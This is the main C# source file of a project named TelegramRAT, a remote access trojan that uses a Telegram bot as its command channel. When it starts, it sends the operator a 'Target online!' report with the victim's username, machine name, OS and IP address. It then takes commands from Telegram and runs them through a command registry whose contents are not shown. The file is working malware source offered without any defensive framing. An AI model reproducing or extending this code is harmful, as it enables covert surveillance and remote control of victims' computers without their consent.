using BotCommand = TelegramRAT.Commands.BotCommand;
using Telegram.Bot.Types.ReplyMarkups;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Polling;
using Telegram.Bot.Exceptions;
using TelegramRAT.Utilities;
using TelegramRAT.Commands;
using System.Diagnostics;
using System.Threading;
using Telegram.Bot.Types;
using Telegram.Bot;
using System.Net;

namespace TelegramRAT;

public static class Program
{
    private static readonly string BotToken = "YOUR_TELEGRAM_BOT_TOKEN";
    private static readonly long? OwnerId = null;

    public static readonly TelegramBotClient Bot = new TelegramBotClient(BotToken);
    public static readonly List<BotCommand> Commands = new();

    private static CancellationTokenSource? _receivingCts;
    private static int _reconnectAttempt;

    public static async Task Main(string[] args)
    {
        if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1)
        {
            Console.WriteLine("Only one instance can be online at the same time!");
            return;
        }

        var currentCts = new CancellationTokenSource();
        _receivingCts = currentCts;

        try
        {
            await RunAsync(currentCts.Token);
        }
        catch (OperationCanceledException) when (currentCts.IsCancellationRequested)
        {
            // Graceful shutdown requested.
        }
        catch (Exception ex)
        {
            currentCts.Cancel();

            if (OwnerId != 0)
            {
                await ReportExceptionAsync(new Message { Chat = new Chat { Id = (long)OwnerId } }, ex);

                if (ex.InnerException?.Message.Contains("Conflict: terminated by other getUpdates request") == true)
                {
                    await SendErrorAsync(new Message { Chat = new Chat { Id = (long)OwnerId } }, new Exception("Only one bot instance can be online at the same time."));
                    return;
                }

                await Bot.SendMessage(
                    OwnerId,
                    "Attempting to restart. Please wait...",
                    parseMode: ParseMode.Html
                );
            }

            Commands.Clear();
            await Main(args);
        }
        finally
        {
            currentCts.Cancel();
            currentCts.Dispose();

            if (ReferenceEquals(_receivingCts, currentCts))
            {
                _receivingCts = null;
            }
        }
    }

    private static async Task RunAsync(CancellationToken cancellationToken)
    {
        var markup = new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Show All Commands"));

        var systemInfo = $"Target online!\n\nUsername: <b>{Environment.UserName}</b>\nPC name: <b>{Environment.MachineName}</b>\nOS: {Utils.GetWindowsVersion()}\n\nIP: {await Utils.GetIpAddressAsync()}";

        await Bot.SendMessage(
            OwnerId,
            systemInfo,
            ParseMode.Html,
            replyMarkup: markup
        );

        CommandRegistry.InitializeCommands(Commands);

        var receiverOptions = new ReceiverOptions
        {
            AllowedUpdates = Array.Empty<UpdateType>()
        };

        await Bot.ReceiveAsync(HandleUpdateAsync, HandlePollingErrorAsync, receiverOptions, cancellationToken);
    }

    private static Task HandleUpdateAsync(ITelegramBotClient bot, Update update, CancellationToken cancellationToken)
    {
        Interlocked.Exchange(ref _reconnectAttempt, 0);
        return UpdateWorkerAsync(update, cancellationToken);
    }

    private static async Task HandlePollingErrorAsync(ITelegramBotClient bot, Exception exception, CancellationToken cancellationToken)
    {
        if (exception is ApiRequestException apiRequestException)
        {
            Console.WriteLine($"Telegram API Error:\n[{apiRequestException.ErrorCode}] {apiRequestException.Message}");
        }
        else
        {
            Console.WriteLine(exception);
        }

        var attempt = Interlocked.Increment(ref _reconnectAttempt);
        var backoffSeconds = Math.Min(Math.Pow(2, attempt), 30);

        try
        {
            await Task.Delay(TimeSpan.FromSeconds(backoffSeconds), cancellationToken);
        }
        catch (OperationCanceledException)
        {
            // Cancellation requested - exit without delaying further.
        }
    }

    private static async Task UpdateWorkerAsync(Update update, CancellationToken cancellationToken)
    {
        cancellationToken.ThrowIfCancellationRequested();

        if (update.CallbackQuery is not null)
        {
            var callback = update.CallbackQuery;
            await Bot.AnswerCallbackQuery(callback.Id, "Callback received!");

            if (callback.Message.ReplyMarkup != null)
            {
                await Bot.EditMessageReplyMarkup(
                    callback.Message.Chat.Id,
                    callback.Message.MessageId,
                    replyMarkup: null
                );
            }

            if (callback.Data == "Show All Commands")
            {
                var cmd = Commands.FirstOrDefault(c => c.Command == "commands");
                if (cmd != null)
                    await cmd.Execute(new BotCommandModel { Message = callback.Message });
            }
            return;
        }

        if (update.Message is null) return;

        var model = BotCommandModel.FromMessage(update.Message, "/");
        if (model == null) return;

        var command = Commands.FirstOrDefault(c => c.Command.Equals(model.Command, StringComparison.OrdinalIgnoreCase)) ??
                      Commands.FirstOrDefault(c => c.Aliases?.Contains(model.Command, StringComparer.OrdinalIgnoreCase) == true);

        if (command == null) return;

        if (command.ValidateModel(model))
        {
            await command.Execute(model);
        }
        else
        {
            await Bot.SendMessage(
                update.Message.Chat.Id,
                $"This command requires arguments!\n\nTo get information about this command - type /help {model.Command}",
                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId },
                parseMode: ParseMode.Html
            );
        }
    }

    public static async Task SendErrorAsync(Message message, Exception ex, bool includeStackTrace = false)
    {
        var encodedMessage = WebUtility.HtmlEncode(ex.Message);
        var errorMessage = includeStackTrace
            ? $"Error: {encodedMessage}\n{WebUtility.HtmlEncode(ex.StackTrace)}"
            : $"Error: {encodedMessage}";

        var replyMarkup = message.ReplyMarkup == null
            ? new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString()))
            : null;

        await Bot.SendMessage(
            message.Chat.Id,
            errorMessage,
            parseMode: ParseMode.Html,
            replyMarkup: replyMarkup
        );
    }

    public static async Task ReportExceptionAsync(Message message, Exception exception)
    {
        #if DEBUG
            bool includeStackTrace = true;
        #else
            bool includeStackTrace = false;
        #endif
        await SendErrorAsync(message, exception, includeStackTrace);
    }

    public static async Task SendSuccessAsync(Message message, string successMessage)
        => await Bot.SendMessage(message.Chat.Id, successMessage, parseMode: ParseMode.Html, replyMarkup: new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString())));

    public static async Task SendInfoAsync(Message message, string infoMessage)
        => await Bot.SendMessage(message.Chat.Id, infoMessage, parseMode: ParseMode.Html, replyMarkup: new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString())));
}
